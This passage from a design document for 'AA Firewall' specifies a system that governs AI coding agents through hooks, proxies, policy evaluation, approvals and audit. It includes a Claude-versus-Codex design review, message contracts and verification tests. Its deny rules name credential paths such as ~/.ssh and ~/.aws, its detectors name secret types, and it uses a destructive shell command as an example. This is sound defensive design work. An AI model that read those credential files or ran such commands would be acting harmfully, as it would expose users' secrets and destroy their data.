        │       ├── audit.go          # HandleQueryEvents, HandleGetSessions, HandleExport
        │       ├── enrich.go         # HandleEnrich (observed_effect update)
        │       ├── policy.go         # Policy CRUD, packs listing/apply
        │       └── metrics.go        # HandleMetrics (6 readiness gates)
        ├── central/
        │   └── server.go             # Management Hub mTLS server (ports 9200/9201)
        ├── client/
        │   └── agent.go              # Sentinel Agent (registration, sync, heartbeat)
        └── console/
            ├── embed.go              # go:embed for Next.js dual static exports (HubHandler + SentinelHandler)
            ├── out-hub/              # Hub Console static assets (served on port 9201)
            └── out-sentinel/         # Sentinel Console static assets (served on port 9100)
```

---

## 19. What to Change with More Time

The Phase 1 prototype makes deliberate simplifications. Each has a planned evolution path:

| Simplification | Phase 1 State | Evolution Path | Phase |
|---|---|---|---|
| **Pattern-based policy** | Command prefixes, path patterns, host allowlists, 20+ secret patterns | Content-aware classification, semantic analysis, data sensitivity labels | Phase 2 |
| **Hook-based interception only** | Claude Code hooks API + env-var proxy | OS-level enforcement (FUSE, eBPF, seccomp) for unmanaged agents and bypass-resistant coverage | Phase 2 |
| **Flat event logs** | Append-only JSONB events with session correlation + 8 anomaly patterns | Graph-native replay with causal linking, delegation trees, impact-diff views, exportable incident bundles | Phase 3 |
| **Single-agent governance** | Claude Code only | Cursor via MCP gateway, Codex via proxy compatibility, Copilot pending analysis | Phase 2 |
| **Ambient credential access** | Agent uses developer's ambient credentials | Scoped credential issuance: action-scoped, time-bounded, destination-bound tokens via secret broker | Phase 2 |
| **Redaction without route-awareness** | 20+ secret/PII patterns with mask/tokenize/summarize modes | Context-sensitive redaction with route-aware policies (internal models see more than external providers) | Phase 2 |
| **Deterministic anomaly detection** | 8 sequence-based patterns without ML baselines | ML-enhanced anomaly models trained on production baselines by environment tier and agent role | Phase 3 |
| **No multi-agent isolation** | Single-agent sessions only | Per-agent trust envelopes, delegation lineage, cross-session isolation | Phase 3 |
| **Management Hub without HA** | Single Management Hub mTLS server for policy distribution + audit | Clustered hub services, leader election, cross-region replication | Phase 3 |
| ~~**TypeScript runtime exposure**~~ | ~~Node.js + npm on target~~ | ~~Port to compiled language~~ | **Done** |

> **Completed:** The core system has been **ported to Go** (4 statically compiled binaries, 192 tests, zero runtime dependencies). The TypeScript source code remains for development of the Next.js Sentinel Console, but is compiled to static assets and embedded in the Go daemon binary. No TypeScript runtime, Node.js, or npm is needed on the target machine.

---

## 20. Open Technical Questions

1. Should the network proxy use a transparent proxy approach (iptables redirect) or explicit proxy (env var)? Explicit is simpler for Phase 1; transparent is more bypass-resistant for Phase 2.
2. What is the right TTL for cached policy decisions before requiring a refresh from the central engine?
3. Should the VS Code extension use WebSocket (real-time push) or polling (simpler) for approval notifications?
4. How should the daemon handle multiple concurrent approval requests from the same session?
5. What is the minimum useful set of command patterns for the default destructive-command policy?
6. Should the prototype support Windows, or is macOS + Linux sufficient for Phase 1?

---

## Appendix A: Peer Review — Claude TDD vs. Codex TDD

> Compared against: `AA_Firewall_TDD_Peer.md` (Codex Peer Draft v2.0, April 27, 2026)
> Comparison date: April 27, 2026

### A.1 Structural Comparison

| Dimension | Claude TDD | Codex TDD | Verdict |
|---|---|---|---|
| **Appendix C traceability** | Requirements referenced inline (R-1 through R-5, C.6) throughout sections but no formal mapping table | Section 0: explicit traceability matrix mapping every Appendix C requirement to specific TDD sections | **Codex is stronger.** The traceability table makes it immediately clear that every ratified requirement is covered and where. |
| **Architecture diagrams** | 13 mermaid diagrams covering system architecture, data flows, agent communication, trust boundaries, and 7 enforcement scenarios | 4 mermaid diagrams: logical architecture, delegation model, allow/approval/deny flows | **Claude is stronger.** Significantly more visual depth — especially the enforcement scenarios, which show the system in action, not just in structure. |
| **Technology stack** | Explicit choices with rationale: TypeScript + Node.js, SQLite local, PostgreSQL central, Docker rootless, YAML policy bundles, VS Code Extension API | Not specified. The Codex TDD is stack-agnostic — it defines contracts and behaviors but does not commit to languages, databases, or frameworks. | **Claude is stronger** for implementation readiness. **Codex is stronger** if the goal is stack-independence. For a prototype TDD, concrete stack choices are needed. |
| **API contracts** | Full request/response JSON examples for `/v1/evaluate`, audit event schema, and approval endpoints. Summary table of all 10 API endpoints. | Full message contract definitions: ActionRequest, PolicyDecision, ApprovalRequest, AuditEvent JSON examples. No endpoint URL paths. | **Equal** — different styles. Claude defines REST endpoints; Codex defines message contracts. Both are needed. |
| **Policy model** | Full YAML policy object example, evaluation order (7 steps), 7 default rules with reason codes, versioning and rollback mechanism | Policy hierarchy described, fields listed, evaluation order stated, default rules referenced but not fully specified with YAML examples | **Claude is stronger.** The YAML examples and full default rule table are directly implementable. |
| **Audit schema** | Full 15+ field JSON event schema, minimum schema validation gate with field mapping table, storage guidance (SQLite buffer + PostgreSQL), indexes | Required fields listed (matching Appendix C), validation gate described with failure behavior, replay model described, immutability stated | **Claude is stronger** on implementable detail (full JSON, indexes, storage tiers). **Codex is stronger** on validation gate failure behavior (reject + metric + alert). |
| **Enforcement scenarios** | 7 detailed scenarios with full mermaid sequence diagrams: file block, shell approval (3 branches), network block, safe workflow, forensic replay, policy rollback, bypass detection | 5 scenarios described in structured text (trigger, enforcement path, required audit chain, system targets). No sequence diagrams for scenarios. | **Claude is significantly stronger.** The sequence diagrams make each scenario unambiguous and walkable. Codex's text format is adequate but less visual. |
| **Agentic AI patterns** | Section 4A: tool-use loop, agent communication model (12-step sequence diagram), multi-agent delegation, trust model | Section 5: pattern table (6 patterns), delegation flowchart. Concise but covers key patterns. | **Claude is stronger** on depth (the 12-step sequence diagram showing hook-by-hook communication is highly valuable). **Codex adds** two useful pattern names: "policy-as-code loop" and "exception with expiry." |
| **Reliability / failure handling** | Fail-closed vs fail-open as a single configuration toggle, described in daemon design section | Dedicated Section 11 with four subsections: policy evaluator unavailable, approval service unavailable, audit pipeline degradation, bypass detection. Each with explicit fallback behavior. | **Codex is stronger.** AA Firewall has four independent failure modes, not just one. Codex identifies each independently with specific fallback strategies. |
| **Verification / testing plan** | No dedicated verification section. Exit criteria per implementation phase cover acceptance but no test categories. | Section 14: four test categories — scenario-based enforcement tests, contract/schema tests, performance/metrics validation, readiness gate reviews. | **Codex is stronger.** A dedicated verification plan ensures testability is designed in, not bolted on. |
| **Project structure** | Full directory tree (40+ files) with file-level descriptions | Not included | **Claude is stronger.** The directory tree gives developers immediate orientation. |
| **Implementation plan** | Phase 0 through Phase 1D with task tables and exit criteria per sub-phase. Day-range estimates. | Phase 0 through Phase 3 with deliverables and exit criteria per phase. No sub-phase breakdown or time estimates. | **Claude is stronger** for Phase 1 execution (sub-phases with tasks and time). **Codex is stronger** on Phase 2/3 exit criteria. |
| **What to change with more time** | 10-row table mapping simplifications to evolution paths with target phase | Section 15: four deferred items listed | **Claude is stronger.** The evolution table is comprehensive and shows the architecture was designed to grow. |

### A.2 Unique Additions

| Item | Claude TDD | Codex TDD | Verdict | Recommendation |
|---|---|---|---|---|
| **Appendix C traceability table** | Not present | Section 0: explicit R-1 through R-5, C.4, C.6, C.7 mapping | **Codex** | Add a traceability table to Claude TDD. Every ratified requirement should have a traceable section reference. |
| **Message contract definitions** | API endpoints with request/response examples | Named contracts (ActionRequest, PolicyDecision, ApprovalRequest, AuditEvent) as typed message objects | **Codex** | Add named contract definitions alongside the API endpoints. Contracts are the interface between components; endpoints are the transport. |
| **Failure mode decomposition** | Single fail-closed/fail-open toggle | Four independent failure modes with per-mode fallback | **Codex** | Expand reliability section to cover policy evaluator unavailable, approval service unavailable, audit pipeline degradation, and bypass detection independently. |
| **Verification plan** | Not present | Section 14: four test categories with specific test items | **Codex** | Add a verification plan section. A TDD without a test strategy is incomplete. |
| **Pattern names for agentic governance** | Described but not named as reusable patterns | Six named patterns (orchestrator-worker, tool mediation, human-supervised branch, policy-as-code loop, exception with expiry, progressive rollout) | **Codex** | Adopt Codex's pattern naming. Named patterns create shared vocabulary across the team. |
| **Audit pipeline backpressure** | Not addressed — events buffered and flushed | Explicit: bounded queue, backpressure handling, alerting on threshold, fail-safe escalation | **Codex** | Add backpressure handling to the audit buffer design. Without it, a burst of agent activity could fill the buffer silently. |
| **Full enforcement scenario diagrams** | 7 scenarios with mermaid sequence diagrams | 5 scenarios in text format, no diagrams | **Claude** | Keep Claude's scenario diagrams. They are the most valuable walkable artifacts in the TDD. |
| **Project structure** | Full directory tree | Not present | **Claude** | Keep. Developers need this on day one. |
| **Tech stack decisions** | Explicit choices with rationale | Not specified (stack-agnostic) | **Claude** | Keep. A prototype TDD must commit to a stack. |
| **Default policy YAML examples** | Full YAML policy object + 7-rule table | Rules listed by name, no YAML | **Claude** | Keep. Implementable examples eliminate ambiguity. |
| **12-step agent communication sequence** | Full sequence diagram | Not present at this level of detail | **Claude** | Keep. Shows exactly how hooks, daemon, and OS interact message-by-message. |

### A.3 Summary

| Dimension | Claude TDD | Codex TDD | Winner |
|---|---|---|---|
| **Implementation readiness** | Stack committed, APIs defined, directory tree, YAML examples, time estimates | Stack-agnostic, contract-oriented, no time estimates | Claude |
| **Visual depth** | 13 mermaid diagrams, 7 enforcement scenario walkthroughs | 4 mermaid diagrams, 5 text-format scenarios | Claude |
| **Traceability** | Inline references but no formal mapping | Explicit traceability matrix | Codex |
| **Operational rigor** | Basic fail mode toggle | Four independent failure modes, backpressure, verification plan | Codex |
| **Testability** | Exit criteria per phase but no test plan | Dedicated verification plan with 4 test categories | Codex |
| **Agentic patterns** | Deep diagrams, agent communication model | Named pattern vocabulary, concise | Equal — different strengths |
| **Policy model** | Full YAML, evaluation order, default rules, rollback | Hierarchy described, evaluation rules stated, less implementable detail | Claude |
| **Audit model** | Full JSON schema, indexes, storage tiers | Fields listed, validation gate failure behavior, backpressure | Equal — different strengths |

**Overall:** Claude TDD is the stronger document for building the prototype — it has the stack, the APIs, the directory tree, the diagrams, and the scenarios a developer needs to start coding. Codex TDD is stronger on operational discipline — traceability, failure decomposition, verification planning, and named patterns. The best final TDD is the Claude version with six additions from Codex: traceability table, named message contracts, failure mode decomposition, verification plan, pattern vocabulary, and audit backpressure handling.

### A.4 Recommendation Disposition

| Recommendation | Source | Disposition | Priority |
|---|---|---|---|
| Add Appendix C traceability table | Codex Section 0 | Adopt | High — add as Section 0 or 1.1 |
| Add named message contracts (ActionRequest, PolicyDecision, ApprovalRequest, AuditEvent) | Codex Section 6.2 | Adopt | High — add alongside existing API definitions |
| Expand failure handling to four independent modes | Codex Section 11 | Adopt | High — replace single fail-mode toggle with per-component fallback |
| Add verification plan section | Codex Section 14 | Adopt | High — add as new section before implementation plan |
| Adopt named agentic governance patterns | Codex Section 5 | Adopt | Medium — add pattern table to Section 4A |
| Add audit pipeline backpressure handling | Codex Section 11.3 | Adopt | Medium — add to audit buffer design in Section 9 |
| Keep all 13 mermaid diagrams and 7 scenario walkthroughs | Claude Sections 4.4, 4.5, 4A, 4B | Keep | Critical — primary value of the TDD |
| Keep tech stack, directory tree, YAML policy examples, API endpoints | Claude Sections 5, 8, 16, 18 | Keep | Critical — required for implementation |
| Keep implementation plan with sub-phases and time estimates | Claude Section 17 | Keep | Critical — drives sprint planning |

---

## Appendix B: Final Consolidated Technical Design (Ratified)

> Status: **Final.** Merges Claude TDD depth with Codex TDD operational additions per Appendix A disposition.
> Source of truth for requirements: PRD Appendix C (Section 27).

This appendix is the authoritative technical reference for the development team. It consolidates the best of both TDDs into a single implementable specification.

### B.1 Appendix C Traceability Matrix

| Appendix C Requirement | TDD Coverage |
|---|---|
| C.2 R-1: Three-surface interception with pre-execution enforcement and `attempted_action`/`observed_effect` | Sections 6 (Interception Layer Design), 4B (Enforcement Scenarios 1-4, 7), 9 (Audit Schema) |
| C.2 R-2: Hierarchical policy, reason codes, policy version stamping | Section 8 (Policy Model), Section 7.2 (Decision API response), Section B.4 (named contracts) |
| C.2 R-3: Reviewer-grade audit schema, minimum schema gate, append-only | Section 9 (Audit Schema, Validation Gate, Storage), Section B.6 (backpressure) |
| C.2 R-4: Approval UX depth area with latency targets, timeout policy, context bundles | Section 10 (Approval Service), Section 11 (VS Code Extension), Section 4B Scenario 2 |
| C.2 R-5: Depth over breadth with readiness gates | Section 17 (Implementation Plan exit criteria), Section B.7 (Verification Plan), Section B.8 (Readiness Gates) |
| C.3: Design principles (P-1 through P-10) | Section 4.1 (Why Hybrid), Section 4A.4 (Trust Model), Section B.5 (Named Patterns), default-deny evaluation order in Section 8.3 |
| C.4: Phased roadmap (Phase 0 through Phase 3) | Section 17 (Implementation Plan), Section 19 (What to Change with More Time) |
| C.5: User stories and acceptance criteria | Section 4B (Enforcement Scenarios map to US-1 through US-5), Section B.7 (Verification Plan) |
| C.6: Integration targets (Phase 1 P0 = Claude Code extension + CLI) | Section 6.2 (Claude Code Integration), Section 17 Phase 1A |
| C.7: Success metrics with definitions and windows | Section 15 (Performance), Section 10.4 (Approval latency), Section B.8 (Readiness Gates) |

### B.2 Final Architecture Decisions

| Decision | Selected Option | Rationale |
|---|---|---|
| Enforcement topology | Hybrid: runtime hook + daemon + proxies | No single interception point provides both semantic context and strong enforcement |
| Primary depth area | Real-time approval UX | Highest enterprise adoption impact and strongest demo value |
| Phase 1 agent | Claude Code (VS Code extension + CLI) | Local execution with practical pre-execution interception via hooks API |
| Policy evaluation | Hierarchical with local cache | Low latency (p50 <10ms) while preserving central governance intent |
| Audit model | Append-only normalized events with schema validation gate | Reviewer usability, forensic traceability, compliance fit |
| Tech stack | Go (compiled binaries, `CGO_ENABLED=0`) + Next.js console (static, embedded via `go:embed`) | Zero runtime dependencies; single binary deployment; TypeScript retained only for console builds |
| Local state | PostgreSQL (no SQLite) | Server-grade persistence; append-only audit; Hub aggregates from multiple Sentinels |
| Central store | PostgreSQL (JSONB) | Immediate queryability, append-only enforcement at DB level |
| Container mode | Docker rootless | Practical isolation for Phase 1, gVisor/Kata deferred to Phase 2 |
| IPC | Local HTTP or Unix domain socket | Low latency, simple contract, no external dependencies |
| Policy format | Versioned YAML bundles | Human-readable, diffable, version-controllable |

### B.3 Final Component Inventory

> **Note:** All core components have been ported to Go. The "Key Files" column shows both the TypeScript source (in `src/`) and the Go port (in `go/internal/`). The Go port is the primary deployment artifact.

| Component | Responsibility | Phase | Key Files |
|---|---|---|---|
| **Local Daemon** | Policy orchestration, approval routing, audit buffering, fail mode enforcement, admin auth | 0/1 | `src/daemon/server.ts`, `auth.ts`, `enforcement-state.ts` |
| **Filesystem Guard** | Path-boundary enforcement, file event normalization | 1 | `src/enforcement/fs-guard.ts` |
| **Shell Proxy** | Command mediation, destructive pattern detection | 1 | `src/enforcement/shell-proxy.ts` |
| **Network Proxy** | Host allowlist enforcement, egress metadata logging | 1 | `src/enforcement/network-proxy.ts` |
| **Package Guard** | Package install detection (npm/pip/brew/yarn/cargo) | 1 | `src/enforcement/package-guard.ts` |
| **Secret Detector** | SSH keys, AWS creds, .env, API keys detection | 1 | `src/enforcement/secret-detector.ts` |
| **Redaction Engine** | 20+ secret/PII patterns, mask/tokenize/summarize modes | 1 | `src/enforcement/redaction.ts` |
| **MCP Gateway** | Protocol-aware MCP tool governance, server registry, trust levels | 1 | `src/enforcement/mcp-gateway.ts` |
| **Hook Handler** | Claude Code hook entry point (stdin JSON, exit 0/2) | 1 | `src/enforcement/hook-handler.ts` |
| **Policy Engine** | Hierarchical evaluation, simulation mode, reason codes, version stamping | 0/1 | `src/policy/engine.ts` |
| **Policy Packs** | 8 canned industry policy packs | 1 | `src/policy/packs.ts` |
| **Approval Service** | Lifecycle management, timeout handling, scope management, break-glass | 1 | `src/approval/service.ts` |
| **Audit Buffer** | In-memory queue buffer with 10K cap and backpressure (Go: `go/internal/audit/buffer.go`) | 0/1 | `src/audit/buffer.ts`, `go/internal/audit/buffer.go` |
| **Audit Store** | PostgreSQL append-only. No in-memory fallback. `NoOpStore` when PG unavailable. `gen_random_uuid()` for event IDs. | 0/1 | `src/audit/store.ts`, `go/internal/audit/pgstore.go` |
| **Flush Service** | Background flush from buffer to PostgreSQL (Go: goroutine + ticker) | 1 | `src/audit/flush.ts`, `go/internal/audit/flush.go` |
| **SIEM Exporter** | Webhook, syslog (UDP), JSONL file transports | 1 | `src/audit/siem-export.ts` |
| **Anomaly Detector** | 8 deterministic sequence-based patterns | 1 | `src/intelligence/anomaly.ts` |
| **Management Hub** | mTLS server for policy distribution, audit aggregation, agent registration | 1 | `src/central/server.ts` |
| **Sentinel Agent** | Registration, policy sync, audit forwarding, heartbeat | 1 | `src/client/agent.ts` |
| **Sentinel Console** | Developer-personal view: my blocks, my compliance score, my session history. No admin access. | 1 | `console/` |
| **Hub Console** | Admin dashboard: all developers, policy management, approval workflow, analytics, group management. Served by Management Hub on port 9201. | 1 | `console/` |
| **Bypass Detector** | Ungoverned action detection, alert emission | 1 | `src/enforcement/bypass-detector.ts` |
| **VS Code Extension** | Hooks registration, approval UI, status bar | 2 | `extension/` (not yet implemented) |
| **Analytics Engine** | Aggregation, developer grouping (10 synthetic groups with professional names), policy recommendations, governed_user-based awareness | 1 | `go/internal/analytics/` |
| **Analytics Dashboard** | Stack-ranked ops, group chart, friction heatmap, one-click recommendations | 1 | `console/src/app/analytics/` |
| **Developer Scorecard** | Per-developer compliance, group badge, trends, tips, weekly digest | 1 | `console/src/app/developer/` |
| **Secret Broker** | Scoped credential mediation | 2 | Deferred |

### B.4 Final Message Contracts

These are the typed interfaces between components. All components communicate using these contracts regardless of transport (HTTP, WebSocket, or in-process).

**ActionRequest** — sent from enforcement point to daemon:

```typescript
interface ActionRequest {
  request_id: string;
  timestamp: string;                    // ISO 8601 UTC
  actor: {
    user_id: string;
    agent_type: string;                 // "claude_code" | "cursor" | "codex"
    agent_instance: string;
    session_id: string;
  };
  environment: {
    workspace: string;
    repo: string;
    branch: string;
    tier: string;                       // "development" | "staging" | "production"
    deployment_mode: string;            // "host" | "container" | "remote"
  };
  action: {
    type: string;                       // "file.read" | "file.write" | "shell.exec" | "network.request"
    attempted_action: string;           // Human-readable description
  };
  resource: {
    kind: string;                       // "file" | "command" | "host" | "mcp_tool"
    path?: string;
    host?: string;
    value?: string;                     // Command string, URL, etc.
    classification?: string[];          // ["destructive"] | ["sensitive_path"] | etc.
  };
}
```

**PolicyDecision** — returned from daemon to enforcement point:

```typescript
interface PolicyDecision {
  request_id: string;
  decision: "allow" | "deny" | "require_approval" | "allow_degraded";
  reason_code: string;                  // Machine-readable: "PATH_OUTSIDE_PROJECT_ROOT"
  reason_human: string;                 // Human-readable explanation
  policy_id: string;
  policy_version: string;              // "v2026.04.26.1"
  approval_required: boolean;
}
```

**ApprovalRequest** — sent from daemon to approval service:

```typescript
interface ApprovalRequest {
  approval_id: string;
  request_id: string;
  context_bundle: {
    actor: string;                      // "dev_001 via claude_code"
    resource: string;                   // "rm -rf node_modules"
    risk_rationale: string;             // "Matches destructive command pattern"
    policy_rule: string;                // "org.approve_destructive_commands"
    agent_identity: string;             // "claude_code (vscode_ext_1)"
    session_summary: string;            // "12 actions, 0 blocks, 0 prior approvals"
  };
  timeout_seconds: number;             // Default: 300
  timeout_behavior: "deny" | "allow";  // Default: "deny"
}
```

**ApprovalDecision** — returned from reviewer:

```typescript
interface ApprovalDecision {
  approval_id: string;
  decision: "approve" | "deny";
  approver_id: string;
  rationale?: string;
  scope?: {
    type: "single" | "session" | "time_bounded";
    pattern?: string;                   // "npm install * from registry.npmjs.org"
    expiry?: string;                    // ISO 8601 for time-bounded
  };
  is_break_glass: boolean;
}
```

**AuditEvent** — emitted by daemon to audit buffer/store:

```typescript
interface AuditEvent {
  event_id: string;
  timestamp: string;
  session_id: string;
  correlation_id: string;

  // Minimum schema gate fields (all required):
  who: string;                          // "{user_id}|{agent_type}|{session_id}"
  what: string;                         // "{action.type}:{attempted_action}"
  when: string;                         // timestamp
  policy: string;                       // "{policy_id}@{policy_version}"
  decision: string;                     // "{decision}:{reason_code}"
  result: string;                       // "executed (exit 0)" | "blocked" | "pending_approval"

  // Full event fields:
  actor: { user_id: string; agent_type: string; agent_instance: string; };
  environment: { workspace: string; repo: string; branch: string; tier: string; deployment_mode: string; };
  action: { type: string; attempted_action: string; observed_effect: string; };
  resource: { kind: string; path?: string; host?: string; value?: string; classification?: string[]; };
  policy_detail: { policy_id: string; policy_version: string; decision: string; reason_code: string; reason_human: string; };
  approval?: { status: string; approver_id?: string; rationale?: string; requested_at?: string; resolved_at?: string; scope?: object; expiry?: string; };
  payload_summary?: { redacted: boolean; content_hash?: string; bytes?: number; };
}
```

### B.5 Final Agentic Governance Patterns

| Pattern | Description | AA Firewall Implementation |
|---|---|---|
| **Orchestrator-worker** | Primary agent delegates to task-specific workers/tools | Preserve actor lineage and session_id across all delegated actions. correlation_id links parent to child. |
| **Tool mediation** | Agent invokes filesystem/shell/network/MCP tools | Every tool action must pass policy gate before execution. Enforcement points intercept at the tool boundary. |
| **Human-supervised branch** | High-risk action branches into approval workflow | Daemon pauses execution, routes context bundle to reviewer, resumes only after signed decision. |
| **Policy-as-code loop** | Governance behavior controlled by versioned policy bundles | Policy version stamped on every decision. Rollback via single operation. Policy changes audited. |
| **Exception with expiry** | Controlled temporary override for approved exceptions | Time-bounded approval scopes, reusable approval windows with explicit expiry. Full audit of grants and expiration. |
| **Progressive rollout** | Strict enforcement and simulation modes coexist | Per-environment mode flags (enforce vs simulate). Simulate mode logs decisions without blocking, enabling safe policy testing. |

### B.6 Final Reliability and Failure Handling

| Failure Mode | Fallback Behavior | Audit Impact |
|---|---|---|
| **Policy evaluator unavailable** (cache expired, central unreachable) | Fall back to last valid signed local bundle. If no valid bundle: deny all governed high-risk actions (fail-closed default). | Emit `policy_evaluator_degraded` audit event with alert flag. |
| **Approval service unavailable** (reviewer unreachable, WebSocket down) | deny-on-timeout for high-risk actions (default). allow-on-timeout only where explicitly admin-configured. | Emit `approval_service_unavailable` audit event. Decision recorded as `deny_timeout` or `allow_timeout_configured`. |
| **Audit pipeline degradation** (PostgreSQL unreachable, network interruption) | Buffer events in in-memory queue with bounded capacity (default: 10,000 events). Emit backpressure alert when queue exceeds 80% capacity. If buffer full: escalate to fail-safe mode -- deny high-risk actions until audit path recovers. `NoOpStore` rejects all audit operations with explicit errors rather than silently dropping data. In strict mode (`AA_STRICT_MODE=1`), daemon refuses to start without PostgreSQL. | Emit `audit_pipeline_degraded` event locally. On recovery, flush all buffered events in order. |
| **Bypass detected** (action reached OS without passing through enforcement point) | Cannot block (action already executed). Log `ungoverned_execution_detected` event with alert flag. Mark session as `degraded_trust` for reviewer attention. | High-severity alert routed to security reviewer. Bypass count tracked as trust metric. |

### B.7 Final Verification Plan

#### VP-1: Scenario-Based Enforcement Tests

| Test | Validates | Acceptance |
|---|---|---|
| File write outside project root → blocked | R-1, US-1 | Write denied, reason_code returned, audit event with `observed_effect: blocked` |
| File read of sensitive path → blocked | R-1, US-1 | Read denied for `~/.ssh/*`, `~/.aws/*` |
| Shell destructive command → approval required | R-1, R-4, US-2 | Execution paused, approval prompt delivered <2s, decision enforced <1s |
| Shell safe command → allowed silently | R-1, US-1 | No interruption, audit event with `observed_effect: executed` |
| Network to allowlisted host → allowed | R-1 | Request forwarded, audit logged |
| Network to unknown host → blocked | R-1, US-1 | Request blocked, reason_code `HOST_NOT_ALLOWLISTED` |
| Approval timeout → deny-on-timeout | R-4 | Action blocked after timeout, audit records timeout decision |
| Approval with reusable scope → subsequent actions auto-approved | R-4 | Second matching action allowed without re-prompting |
| Break-glass override → allowed with elevated audit | R-4 | Action allowed, audit event marked `is_break_glass: true`, severity elevated |
| Bypass detection → ungoverned action flagged | R-1, Trust metrics | Alert emitted, session marked `degraded_trust` |

#### VP-2: Contract and Schema Tests

| Test | Validates | Acceptance |
|---|---|---|
| ActionRequest missing required field → rejected | Contract validity | Daemon returns 400 with specific field error |
| AuditEvent missing minimum gate field → rejected by store | R-3 | Event not stored, internal error metric incremented, alert emitted |
| AuditEvent with all fields → accepted | R-3 | Event stored, queryable, exportable |
| PolicyDecision includes reason_code and policy_version | R-2 | Every decision response contains both fields, verified across all surfaces |
| Policy bundle version mismatch → rejected | R-2 | Daemon refuses unsigned or version-mismatched bundles |

#### VP-3: Performance and Metrics Validation

| Test | Validates | Acceptance |
|---|---|---|
| Policy decision latency under load (100 concurrent actions) | C.7 | p50 <10ms, p95 <50ms |
| Approval delivery latency | C.7 | <2 seconds from require_approval to reviewer-visible |
| Approval enforcement latency | C.7 | <1 second from reviewer click to action proceed/block |
| Audit event throughput (1000 events/minute sustained) | C.7 | All events stored, schema validation pass rate 100% |
| Backpressure trigger at 80% buffer capacity | B.6 | Alert emitted, no events lost |

#### VP-4: Readiness Gate Reviews

Before Phase 1 → Phase 2 transition, run formal gate review with evidence:

| Gate | Target | Evidence Required |
|---|---|---|
| Policy mediation rate | >95% | 7-day rolling metric from production pilot |
| Enforcement fidelity | >99% | Denied action block success rate |
| False-positive block rate | <5% | 30-day rolling metric with reviewer feedback |
| Audit completeness | >99% | 7-day rolling full-chain event rate |
| Schema validation pass rate | 100% | Continuous monitoring, zero failures |
| Operational approval median | <60 seconds | 7-day rolling from approval service logs |

### B.8 Final Success Metrics (from Appendix C, with TDD measurement points)

| Metric | Target | Where Measured |
|---|---|---|
| Policy mediation rate (>95%) | Daemon `/v1/metrics` | Count of evaluate calls vs bypass detector events |
| Enforcement fidelity (>99%) | Daemon audit events | Denied decisions where `observed_effect = blocked` vs total denies |
| False-positive block rate (<5%) | Review console feedback | "Mark as false positive" action on denied/approval events |
| Policy decision latency (p50 <10ms, p95 <50ms) | Daemon instrumentation | Timer around policy engine evaluate call |
| Approval delivery latency (<2s) | Extension instrumentation | Timer from daemon WebSocket push to extension render |
| Approval enforcement latency (<1s) | Daemon instrumentation | Timer from resolve API call to enforcement point unblock |
| End-to-end approval time (median <60s) | Approval service logs | `resolved_at - requested_at` per approval |
| Audit completeness (>99%) | Audit store query | Events with full chain / total governed actions |
| Schema validation pass rate (100%) | Audit validate gate | Rejected events / total emitted events |
| Bypass attempts detected | Bypass detector | Count of `ungoverned_execution_detected` events |
